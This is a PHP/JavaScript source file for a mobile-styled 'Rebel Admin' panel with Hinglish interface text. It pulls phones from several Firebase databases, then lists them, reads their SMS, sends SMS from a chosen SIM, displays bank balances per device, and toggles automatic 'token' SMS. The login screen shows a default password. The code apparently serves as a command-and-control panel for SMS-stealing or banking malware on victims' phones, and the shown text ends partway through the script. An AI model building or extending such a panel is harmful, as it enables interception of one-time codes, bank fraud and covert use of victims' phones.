<?php
require_once __DIR__ . '/rebel_bot_lib.php';

rebel_admin_session_start();

if (isset($_GET['rebel_firebase_api']) || isset($_POST['rebel_firebase_api'])) {
  rebel_firebase_api_handle(true);
}

$loginError = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rebel_admin_login'])) {
  $pass = (string)($_POST['password'] ?? '');
  if (rebel_admin_login($pass)) {
    header('Location: admin.php');
    exit;
  }
  $loginError = 'Galat password — dubara try karo';
}

if (isset($_GET['logout'])) {
  rebel_admin_logout();
  header('Location: admin.php');
  exit;
}

$loggedIn = rebel_admin_logged_in();
$serverProjects = rebel_firebase_list();

if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
  if (!is_array($body)) {
    $body = [];
  }

  $deviceId = trim((string)($body['device_id'] ?? ''));
  $to = trim((string)($body['to'] ?? ''));
  $message = trim((string)($body['message'] ?? ''));
  $sim = max(1, (int)($body['sim'] ?? 1));
  $fbUrl = rtrim(trim((string)($body['database_url'] ?? '')), '/');
  $fbKey = trim((string)($body['auth_key'] ?? ''));
  $schema = strtolower(trim((string)($body['schema'] ?? 'rabel')));
  $deviceNode = trim((string)($body['device_node'] ?? 'clients'));

  $result = rebel_send_sms_to_device($fbUrl, $fbKey, $deviceId, $sim, $to, $message, $schema, $deviceNode);
  rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
}

function rebel_avatar_url() {
  if (is_file(__DIR__ . '/assets/rebel-avatar.jpg')) return 'assets/rebel-avatar.jpg';
  if (is_file(__DIR__ . '/rebel-avatar.jpg')) return 'rebel-avatar.jpg';
  return 'https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg';
}
$REBEL_AVATAR_URL = rebel_avatar_url();

header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no"/>
<meta name="theme-color" content="#050508"/>
<meta name="apple-mobile-web-app-capable" content="yes"/>
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
<title>Rebel Panel Admin</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<style>
:root{
  --bg:#050508;--surface:#0d0d14;--card:#14141f;--border:#2a2a3a;
  --accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;
  --success:#00ff9d;--error:#ff4466;--nav-h:64px;--hdr-h:56px;
  --safe-t:env(safe-area-inset-top,0px);--safe-b:env(safe-area-inset-bottom,0px);
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;overflow:hidden}
body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
.app{position:fixed;inset:0;display:flex;flex-direction:column;background:
  radial-gradient(ellipse 80% 50% at 50% -20%,rgba(255,60,60,0.15),transparent),
  radial-gradient(ellipse 60% 40% at 100% 100%,rgba(255,149,0,0.08),transparent),
  var(--bg)}
.hidden{display:none!important}
.mono{font-family:'Space Mono',monospace}

/* LOGIN */
.login-screen{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;padding:24px;padding-top:calc(24px + var(--safe-t))}
.login-card{width:100%;max-width:360px;padding:28px 22px;border-radius:24px;background:linear-gradient(160deg,rgba(20,20,30,0.95),rgba(10,10,16,0.98));border:1px solid rgba(255,60,60,0.2);box-shadow:0 24px 60px rgba(0,0,0,0.5)}
.login-logo{display:flex;align-items:center;gap:12px;margin-bottom:24px}
.login-logo .mark{width:44px;height:44px;border-radius:14px;background:rgba(255,60,60,0.12);border:1.5px solid var(--accent);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent);font-size:20px}
.login-logo h1{font-size:22px;font-weight:800}
.login-logo em{color:var(--accent);font-style:normal}
.login-sub{color:var(--muted);font-size:12px;margin:-16px 0 20px}
.key-input{width:100%;padding:16px 14px;border-radius:14px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-family:'Space Mono',monospace;font-size:14px;letter-spacing:1px;text-transform:uppercase;outline:none}
.key-input:focus{border-color:var(--accent)}
.login-err{color:var(--error);font-size:12px;margin:10px 0;display:none}
.btn-primary{width:100%;margin-top:16px;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--accent),#cc2020);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:15px;cursor:pointer}
.btn-primary:disabled{opacity:0.6}
.remember{display:flex;align-items:center;gap:8px;margin-top:14px;font-size:12px;color:var(--muted)}
.remember input{width:18px;height:18px;accent-color:var(--accent)}

/* REBEL AVATAR — circle fixed, image animates (pure CSS, no JS needed) */
.avatar-stage{width:180px;height:215px;margin:0 auto 10px;position:relative}
.avatar-face-ring{width:132px;height:132px;margin:0 auto;border-radius:50%;overflow:hidden;border:2px solid var(--border);background:#0a0a10;box-shadow:0 8px 24px rgba(0,0,0,.45);position:relative;z-index:2}
.avatar-img-wrap{width:100%;height:100%;animation:rebelImgLook 9s ease-in-out infinite;-webkit-animation:rebelImgLook 9s ease-in-out infinite}
.avatar-face{width:145%;height:145%;max-width:none;object-fit:cover;object-position:50% 30%;display:block;margin:-22.5%}
.avatar-laptop{position:absolute;left:50%;bottom:0;width:120px;z-index:5;pointer-events:none;animation:rebelLaptop 9s ease-in-out infinite;-webkit-animation:rebelLaptop 9s ease-in-out infinite}
@keyframes rebelImgLook{
  0%,10%{transform:translate(0,0)}
  14%,26%{transform:translate(-26px,0)}
  30%,42%{transform:translate(26px,0)}
  46%,50%{transform:translate(0,0)}
  54%,76%{transform:translate(0,20px)}
  80%,100%{transform:translate(0,0)}
}
@-webkit-keyframes rebelImgLook{
  0%,10%{-webkit-transform:translate(0,0)}
  14%,26%{-webkit-transform:translate(-26px,0)}
  30%,42%{-webkit-transform:translate(26px,0)}
  46%,50%{-webkit-transform:translate(0,0)}
  54%,76%{-webkit-transform:translate(0,20px)}
  80%,100%{-webkit-transform:translate(0,0)}
}
@keyframes rebelLaptop{
  0%,50%{opacity:0;transform:translate3d(-50%,48px,0) scale(.45)}
  54%,58%{opacity:1;transform:translate3d(-50%,0,0) scale(1.08)}
  62%,76%{opacity:1;transform:translate3d(-50%,0,0) scale(1)}
  80%,100%{opacity:0;transform:translate3d(-50%,48px,0) scale(.45)}
}
@-webkit-keyframes rebelLaptop{
  0%,50%{opacity:0;-webkit-transform:translate3d(-50%,48px,0) scale(.45)}
  54%,58%{opacity:1;-webkit-transform:translate3d(-50%,0,0) scale(1.08)}
  62%,76%{opacity:1;-webkit-transform:translate3d(-50%,0,0) scale(1)}
  80%,100%{opacity:0;-webkit-transform:translate3d(-50%,48px,0) scale(.45)}
}
.laptop-lid{background:linear-gradient(180deg,#2a2a35,#1a1a22);border:2px solid #3a3a48;border-radius:6px 6px 2px 2px;padding:6px 7px 4px;transform-origin:bottom center}
.laptop-screen{background:#0a0f14;border-radius:3px;padding:6px 7px;min-height:42px;overflow:hidden;border:1px solid #1e3a2f}
.laptop-code{font-family:'Space Mono',monospace;font-size:7px;line-height:1.6;color:#00ff9d}
.laptop-code .dim{color:#4a6a5a}
.laptop-code .hi{color:#7b9cff}
.laptop-cursor{display:inline-block;width:4px;height:9px;background:#00ff9d;margin-left:1px;animation:blinkCursor .55s step-end infinite;vertical-align:middle}
.laptop-base{height:6px;background:linear-gradient(180deg,#3a3a48,#252530);border-radius:0 0 8px 8px;margin:0 5px;border:1px solid #4a4a58;border-top:none}
.laptop-line{display:block;opacity:0;transform:translateX(-6px)}
.laptop-line.l1{animation:rebelCode1 9s ease-in-out infinite}
.laptop-line.l2{animation:rebelCode2 9s ease-in-out infinite}
.laptop-line.l3{animation:rebelCode3 9s ease-in-out infinite}
@keyframes rebelCode1{0%,56%{opacity:0;transform:translateX(-6px)}60%,76%{opacity:1;transform:none}80%,100%{opacity:0}}
@keyframes rebelCode2{0%,62%{opacity:0;transform:translateX(-6px)}66%,76%{opacity:1;transform:none}80%,100%{opacity:0}}
@keyframes rebelCode3{0%,68%{opacity:0;transform:translateX(-6px)}72%,76%{opacity:1;transform:none}80%,100%{opacity:0}}
.laptop-glow{position:absolute;inset:auto -8px -6px -8px;height:20px;background:radial-gradient(ellipse,rgba(0,255,157,.18),transparent 70%);pointer-events:none;animation:rebelLaptopGlow 9s ease-in-out infinite}
@keyframes rebelLaptopGlow{0%,52%{opacity:0}56%,78%{opacity:1}82%,100%{opacity:0}}
.rebel-avatar-sm{width:40px;height:40px;flex-shrink:0}
.rebel-avatar-sm img{width:100%;height:100%;border-radius:50%;object-fit:cover;display:block;border:1px solid var(--border);background:#111}
.login-hero{text-align:center;margin-bottom:8px}
.login-hero h1{font-size:22px;font-weight:800;margin-top:4px}
.login-hero em{color:var(--accent);font-style:normal}
@keyframes blinkCursor{0%,100%{opacity:1}50%{opacity:0}}

/* HEADER */
.hdr{flex-shrink:0;height:calc(var(--hdr-h) + var(--safe-t));padding-top:var(--safe-t);padding-left:16px;padding-right:16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.06);backdrop-filter:blur(12px);background:rgba(5,5,8,0.85);z-index:10}
.hdr-left{display:flex;align-items:center;gap:10px;min-width:0}
.hdr-title{font-size:15px;font-weight:800;white-space:nowrap}
.hdr-sub{font-size:9px;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:1px}
.hdr-actions{display:flex;gap:8px;flex-shrink:0}
.icon-btn{width:38px;height:38px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.fb-chip{max-width:110px;padding:8px 12px;border-radius:100px;border:1px solid rgba(255,149,0,0.3);background:rgba(255,149,0,0.1);color:var(--accent2);font-family:'Space Mono',monospace;font-size:9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

/* SCREENS */
.screens{flex:1;overflow:hidden;position:relative}
.screen{position:absolute;inset:0;overflow-y:auto;-webkit-overflow-scrolling:touch;padding:12px 14px calc(var(--nav-h) + var(--safe-b) + 16px);opacity:0;pointer-events:none;transform:translateX(12px);transition:opacity .22s ease,transform .22s ease}
.screen.active{opacity:1;pointer-events:auto;transform:none}

/* STATS */
.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
.stat-card{padding:12px 10px;border-radius:14px;background:var(--card);border:1px solid var(--border);text-align:center}
.stat-val{font-size:20px;font-weight:800;font-family:'Space Mono',monospace}
.stat-val.on{color:var(--success)}.stat-val.off{color:var(--error)}
.stat-lbl{font-size:8px;color:var(--muted);letter-spacing:1px;margin-top:2px}

.search-wrap{margin-bottom:12px}
.search{width:100%;padding:12px 14px;border-radius:14px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:14px;outline:none}
.search:focus{border-color:var(--accent)}

/* DEVICE CARDS */
.dev-card{display:flex;gap:12px;padding:14px;margin-bottom:10px;border-radius:16px;background:var(--card);border:1px solid var(--border);cursor:pointer;transition:transform .15s ease,border-color .15s}
.dev-card:active{transform:scale(0.98)}
.dev-card.active{border-color:rgba(255,60,60,0.5);box-shadow:0 0 20px rgba(255,60,60,0.12)}
.dev-bar{width:4px;border-radius:4px;background:var(--muted);flex-shrink:0}
.dev-card.online .dev-bar{background:var(--success);box-shadow:0 0 8px var(--success)}
.dev-body{flex:1;min-width:0}
.dev-phone{font-size:15px;font-weight:800;margin-bottom:2px}
.dev-meta{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.dev-chips{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px}
.chip{font-size:8px;padding:3px 8px;border-radius:20px;border:1px solid var(--border);color:var(--muted);font-family:'Space Mono',monospace}
.chip.bat{color:var(--success);border-color:rgba(0,255,157,0.25)}
.empty-state{text-align:center;padding:48px 20px;color:var(--muted)}
.empty-state .ico{font-size:40px;margin-bottom:12px;opacity:0.5}

/* DEVICE HERO */
.hero-card{padding:18px;border-radius:20px;background:linear-gradient(145deg,rgba(255,60,60,0.12),rgba(20,20,30,0.95));border:1px solid rgba(255,60,60,0.2);margin-bottom:14px}
.hero-phone{font-size:22px;font-weight:800;margin-bottom:4px}
.hero-model{font-size:12px;color:var(--muted);margin-bottom:12px}
.hero-badge{display:inline-block;padding:5px 12px;border-radius:100px;font-size:10px;font-weight:800;font-family:'Space Mono',monospace;margin-bottom:14px}
.hero-badge.online{background:rgba(0,255,157,0.15);color:var(--success)}
.hero-badge.offline{background:rgba(107,107,136,0.15);color:var(--muted)}
.hero-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
.hero-cell{padding:10px;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.05)}
.hero-lbl{font-size:8px;color:var(--muted);letter-spacing:1px;margin-bottom:4px}
.hero-val{font-size:14px;font-weight:700;font-family:'Space Mono',monospace}

/* SMS CHAT */
.sms-list{display:flex;flex-direction:column;gap:10px}
.sms-bubble{max-width:92%;padding:12px 14px;border-radius:16px;font-size:13px;line-height:1.45}
.sms-bubble.in{align-self:flex-start;background:var(--card);border:1px solid var(--border);border-bottom-left-radius:4px}
.sms-bubble.out{align-self:flex-end;background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.25);border-bottom-right-radius:4px}
.sms-from{font-size:10px;font-weight:800;margin-bottom:4px;color:var(--accent2)}
.sms-time{font-size:9px;color:var(--muted);margin-top:6px;font-family:'Space Mono',monospace}
.sms-badge{display:inline-block;font-size:7px;padding:2px 6px;border-radius:6px;background:rgba(255,60,60,0.2);color:var(--accent);margin-left:6px}

/* SEND FORM */
.form-card{padding:16px;border-radius:18px;background:var(--card);border:1px solid var(--border)}
.form-label{display:block;font-size:11px;color:var(--muted);margin-bottom:6px;font-weight:600}
.form-input,.form-textarea{width:100%;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:15px;outline:none;margin-bottom:14px}
.form-textarea{min-height:120px;resize:none;font-family:inherit}
.sim-selector{display:flex;gap:8px;margin-bottom:14px}
.sim-chip{flex:1;padding:8px 10px;border-radius:12px;border:1px solid var(--border);background:var(--card);color:var(--text);text-align:center;font-size:12px;font-weight:600;cursor:pointer}
.sim-chip.active{border-color:var(--accent);background:rgba(255,60,60,0.12)}
.btn-send{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--success),#00cc7a);color:#050508;font-weight:800;font-size:15px;cursor:pointer}
.btn-ping{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--accent2),#cc8800);color:#050508;font-weight:800;font-size:15px;cursor:pointer;margin-top:8px}
.send-status{margin-top:10px;font-size:11px;font-family:'Space Mono',monospace;text-align:center}

/* BANK CARDS (Mobile) */
.bank-grid-m{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
.bank-card-m{padding:16px;border-radius:16px;background:var(--card);border:1px solid var(--border);margin-bottom:12px}
.bank-name-m{font-size:16px;font-weight:800;margin-bottom:4px}
.bank-acct-m{font-size:11px;color:var(--muted);font-family:'Space Mono',monospace;margin-bottom:8px}
.bank-stat-m{background:rgba(255,255,255,0.04);border-radius:10px;padding:10px}
.bank-stat-lbl-m{font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:1px}
.bank-stat-val-m{font-size:16px;font-weight:700;font-family:'Space Mono',monospace;margin-top:4px}
.bank-stat-val-m.current{color:var(--accent2)}
.bank-meta-m{font-size:10px;color:var(--muted);margin-top:10px;font-family:'Space Mono',monospace}
.bank-empty{text-align:center;padding:40px 16px;color:var(--muted)}
.bank-empty .ico{font-size:48px;margin-bottom:12px;opacity:0.5}

/* MORE */
.menu-list{display:flex;flex-direction:column;gap:8px}
.menu-item{display:flex;align-items:center;justify-content:space-between;padding:16px;border-radius:14px;background:var(--card);border:1px solid var(--border);cursor:pointer;font-size:14px;font-weight:600}
.menu-item span{color:var(--muted);font-size:12px;font-weight:400}
.menu-item.danger{border-color:rgba(255,68,102,0.3);color:var(--error)}
.toggle{width:44px;height:26px;border-radius:100px;background:var(--border);position:relative;transition:background .2s}
.toggle.on{background:var(--success)}
.toggle::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;border-radius:50%;background:#fff;transition:transform .2s}
.toggle.on::after{transform:translateX(18px)}
.proto-tag{display:inline-block;padding:4px 10px;border-radius:8px;background:rgba(123,47,255,0.15);color:#b388ff;font-size:9px;font-family:'Space Mono',monospace;margin-bottom:14px}

/* BOTTOM NAV */
.bottom-nav{flex-shrink:0;height:calc(var(--nav-h) + var(--safe-b));padding-bottom:var(--safe-b);display:flex;background:rgba(8,8,12,0.95);border-top:1px solid rgba(255,255,255,0.06);backdrop-filter:blur(16px)}
.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;border:none;background:transparent;color:var(--muted);font-size:9px;font-family:'Space Mono',monospace;cursor:pointer;padding:8px 4px}
.nav-item .ico{font-size:20px;line-height:1}
.nav-item.active{color:var(--accent)}
.nav-item.active .ico{filter:drop-shadow(0 0 6px var(--accent))}

/* SHEET */
.sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:50;opacity:0;pointer-events:none;transition:opacity .25s}
.sheet-bg.open{opacity:1;pointer-events:auto}
.sheet{position:fixed;left:0;right:0;bottom:0;z-index:51;background:var(--surface);border-radius:20px 20px 0 0;padding:12px 16px calc(20px + var(--safe-b));max-height:70vh;overflow-y:auto;transform:translateY(100%);transition:transform .28s cubic-bezier(.32,.72,0,1)}
.sheet.open{transform:translateY(0)}
.sheet-handle{width:36px;height:4px;border-radius:4px;background:var(--border);margin:0 auto 16px}
.sheet-title{font-size:13px;font-weight:800;margin-bottom:12px}
.fb-option{display:flex;align-items:center;justify-content:space-between;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--card);margin-bottom:8px;cursor:pointer}
.fb-option.active{border-color:var(--accent);background:rgba(255,60,60,0.08)}
.fb-option .cnt{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace}
.fb-add-form{padding:12px 0 8px;border-top:1px solid var(--border);margin-top:8px}
.fb-add-form input{width:100%;padding:12px 14px;margin-bottom:8px;border-radius:12px;border:1px solid var(--border);background:var(--card);color:var(--text);font-size:13px;outline:none}
.fb-add-form input:focus{border-color:var(--accent)}
.btn-add-fb{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent2),#cc7700);color:#111;font-weight:800;font-size:14px;cursor:pointer;margin-top:4px}
.chip.fb{background:rgba(255,149,0,0.15);color:var(--accent2);font-size:9px}

.toast-wrap{position:fixed;top:calc(12px + var(--safe-t));left:14px;right:14px;z-index:200;pointer-events:none}
.toast{padding:12px 14px;border-radius:12px;background:var(--card);border:1px solid var(--border);font-size:12px;margin-bottom:8px;animation:toastIn .3s ease}
.toast.ok{border-color:rgba(0,255,157,0.3)}.toast.err{border-color:rgba(255,68,102,0.3)}
@keyframes toastIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:none}}
</style>
</head>
<body>

<?php if (!$loggedIn): ?>
<div class="login-screen">
  <div class="login-card">
    <div class="login-hero">
      <div class="avatar-stage">
        <div class="avatar-face-ring">
          <div class="avatar-img-wrap">
            <img class="avatar-face" src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
          </div>
        </div>
        <div class="avatar-laptop">
          <div class="laptop-lid">
            <div class="laptop-screen">
              <div class="laptop-code">
                <span class="laptop-line l1"><span class="dim">// admin</span> firebase.sync()</span>
                <span class="laptop-line l2"><span class="hi">await</span> mobile.php</span>
                <span class="laptop-line l3">projects<span class="laptop-cursor"></span></span>
              </div>
            </div>
            <div class="laptop-base"></div>
          </div>
          <div class="laptop-glow"></div>
        </div>
      </div>
      <h1>Rebel <em>Admin</em></h1>
    </div>
    <p class="login-sub">Firebase yahan add karo — mobile panel mein auto sync hoga.</p>
    <?php if ($loginError !== ''): ?><div class="login-err" style="display:block"><?php echo htmlspecialchars($loginError, ENT_QUOTES, 'UTF-8'); ?></div><?php endif; ?>
    <form method="post">
      <input type="hidden" name="rebel_admin_login" value="1"/>
      <input class="key-input" type="password" name="password" placeholder="Admin password" required autofocus style="text-transform:none;letter-spacing:0"/>
      <button class="btn-primary" type="submit">Login</button>
    </form>
    <p class="login-sub" style="margin-top:14px;margin-bottom:0">Default: <span class="mono">rebeladmin</span></p>
  </div>
</div>
<?php else: ?>

<!-- APP -->
<div class="app" id="appShell">
  <header class="hdr">
    <div class="hdr-left">
      <div class="rebel-avatar-sm">
        <img src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
      </div>
      <div>
        <div class="hdr-title">Rebel Admin</div>
        <div class="hdr-sub" id="hdrSub">Connecting...</div>
      </div>
    </div>
    <div class="hdr-actions">
      <button class="fb-chip" id="fbChip" onclick="openFbSheet()">Firebase ▾</button>
      <button class="icon-btn" onclick="refreshData()" title="Refresh">↻</button>
    </div>
  </header>

  <div class="screens">
    <section class="screen active" id="screen-home">
      <div class="stats-row">
        <div class="stat-card"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">DEVICES</div></div>
        <div class="stat-card"><div class="stat-val on" id="stOnline">0</div><div class="stat-lbl">ONLINE</div></div>
        <div class="stat-card"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
      </div>
      <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search phone or device..." oninput="renderDevices()"/></div>
      <div id="devList"></div>
    </section>

    <section class="screen" id="screen-device">
      <div id="deviceEmpty" class="empty-state"><div class="ico">📱</div>Select a device from Home</div>
      <div id="deviceHero" class="hidden"></div>
    </section>

    <section class="screen" id="screen-sms">
      <div id="smsEmpty" class="empty-state"><div class="ico">💬</div>Select a device to view SMS</div>
      <div class="sms-list" id="smsList"></div>
    </section>

    <section class="screen" id="screen-send">
      <div id="sendEmpty" class="empty-state"><div class="ico">📤</div>Select a device to send SMS</div>
      <div class="form-card hidden" id="sendForm">
        <label class="form-label">Send from SIM</label>
        <div class="sim-selector" id="simSelector">
          <div class="sim-chip active" data-sim="1" onclick="selectSim(1,this)">SIM 1</div>
          <div class="sim-chip" data-sim="2" onclick="selectSim(2,this)">SIM 2</div>
        </div>
        <label class="form-label">To Number</label>
        <input class="form-input" id="sendTo" type="tel" placeholder="9876543210"/>
        <label class="form-label">Message</label>
        <textarea class="form-textarea" id="sendMsg" placeholder="Type message..."></textarea>
        <button class="btn-send" onclick="sendSms()">Send SMS</button>
        <button class="btn-ping" onclick="checkRecharge()">📱 Check Recharge (Ping)</button>
        <div class="send-status" id="sendStatus"></div>
      </div>
    </section>

    <!-- NEW: BANK SECTION -->
    <section class="screen" id="screen-bank">
      <div id="bankEmpty" class="bank-empty"><div class="ico">🏦</div>Select a device to load bank balances</div>
      <div id="bankList"></div>
    </section>

    <section class="screen" id="screen-more">
      <span class="proto-tag">👑 ADMIN PANEL</span>
      <div class="menu-list">
        <div class="menu-item" onclick="openFbSheet()">Firebase Projects <span id="moreFbName">—</span></div>
        <a class="menu-item" href="mobile.php" style="text-decoration:none;color:inherit">Mobile Panel <span>mobile.php →</span></a>
        <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
        <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
        <a class="menu-item danger" href="admin.php?logout=1" style="text-decoration:none;color:inherit">Logout <span>Exit admin</span></a>
      </div>
    </section>
  </div>

  <nav class="bottom-nav">
    <button class="nav-item active" data-tab="home" onclick="switchTab('home',this)"><span class="ico">🏠</span>Home</button>
    <button class="nav-item" data-tab="device" onclick="switchTab('device',this)"><span class="ico">📱</span>Device</button>
    <button class="nav-item" data-tab="sms" onclick="switchTab('sms',this)"><span class="ico">💬</span>SMS</button>
    <button class="nav-item" data-tab="send" onclick="switchTab('send',this)"><span class="ico">📤</span>Send</button>
    <button class="nav-item" data-tab="bank" onclick="switchTab('bank',this)"><span class="ico">🏦</span>Bank</button>
    <button class="nav-item" data-tab="more" onclick="switchTab('more',this)"><span class="ico">⚙️</span>More</button>
  </nav>
</div>

<div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
<div class="sheet" id="fbSheet">
  <div class="sheet-handle"></div>
  <div class="sheet-title">Firebase Projects — All Combined</div>
  <div id="fbSheetList"></div>
  <div class="fb-add-form">
    <input id="fbAddName" placeholder="Project name (e.g. Panel 2)"/>
    <input id="fbAddUrl" placeholder="Firebase URL — https://xxx.firebaseio.com"/>
    <input id="fbAddSecret" placeholder="Database secret / auth key (optional)"/>
    <input id="fbAddApiKey" placeholder="Web API key (optional — for live updates)"/>
    <button class="btn-add-fb" type="button" onclick="addFirebaseProject()">+ Add Firebase Project</button>
  </div>
</div>
<div class="toast-wrap" id="toasts"></div>

<?php endif; ?>

<script src="firebase_defaults.js"></script>
<script>
<?php if ($loggedIn): ?>
var SEND_SMS_URL='admin.php?rebel_send_sms=1';
var SMS_TOKEN_URL='sex.php?sms_token_api=1';
var FIREBASE_API_URL='admin.php?rebel_firebase_api=1';
var SERVER_FIREBASES=<?= json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE) ?>;
var allDevs=[], selDev='', clientsRawMap={};
var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
var SUMMARY_NODES=['devices_status','clients'];
var DEVICE_NODES=['devices','users','clients_list','online_devices'];

// ---- FIX: Online status accuracy ----
var ONLINE_FRESH_MS=60000;
var ONLINE_STALE_MS=120000;
var ONLINE_FLAG_TRUST_MS=180000;

function extractHeartbeatMs(raw){
  if(!raw||typeof raw!=='object') return 0;
  var keys=['_lastOnlineMs','last_seen','lastSeen','last_ping','lastPing','last_ping_at','lastPingAt','updated_at','updatedAt','timestamp','timestamp_millis','heartbeat','last_heartbeat','ping_at','ping_time','seen_at'];
  var best=0,i,ms;
  for(i=0;i<keys.length;i++){ms=toTimestampMs(raw[keys[i]]);if(ms>best) best=ms;}
  if(raw.live_data&&typeof raw.live_data==='object'){ms=extractHeartbeatMs(raw.live_data);if(ms>best) best=ms;}
  if(raw.device_info&&typeof raw.device_info==='object'){ms=extractHeartbeatMs(raw.device_info);if(ms>best) best=ms;}
  return best;
}
function toTimestampMs(v){if(v==null||v==='')return 0;if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;if(typeof v==='string'){if(!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}var t=Date.parse(v);if(!isNaN(t))return t;}return 0;}
function hasExplicitOnlineFlag(s){if(!s)return false;return s.online_status===true||s.online===true||s.status===true||s.status==='online';}
function hasExplicitOfflineFlag(s){if(!s)return false;return s.online_status===false||s.status===false||s.status==='offline';}
function resolveOnlineStatus(s,fbId){
  if(!s)return false;
  var now=Date.now();
  var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
  var hb=extractHeartbeatMs(s);var hbAge=hb?now-hb:Infinity;
  var flagOn=hasExplicitOnlineFlag(s);var flagOff=hasExplicitOfflineFlag(s);
  if(schema==='rabel'&&(s.status===true||s.online===true))flagOn=true;
  if(flagOn){if(!hb)return true;if(hbAge<=ONLINE_FLAG_TRUST_MS)return true;if(hbAge>ONLINE_FLAG_TRUST_MS*2)return false;return true;}
  if(flagOff){if(hb&&hbAge<=ONLINE_FRESH_MS)return true;return false;}
  if(hb&&hbAge<=ONLINE_STALE_MS)return true;return false;
}

var DEFAULT_FIREBASES=typeof REBEL_DEFAULT_FIREBASES!=='undefined'?REBEL_DEFAULT_FIREBASES:[];

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}
function makeDevKey(fbId,devId){return fbId+'::'+devId;}
function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
function getFilteredDevs(){return allDevs;}
function adminApiPost(body){
  return fetch(FIREBASE_API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{}),credentials:'same-origin'})
    .then(function(r){return r.json();});
}
function saveFirebaseConfigs(){}
function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){
  if(!r.ok)return null;
  return r.json();
}).catch(function(){return null;});}
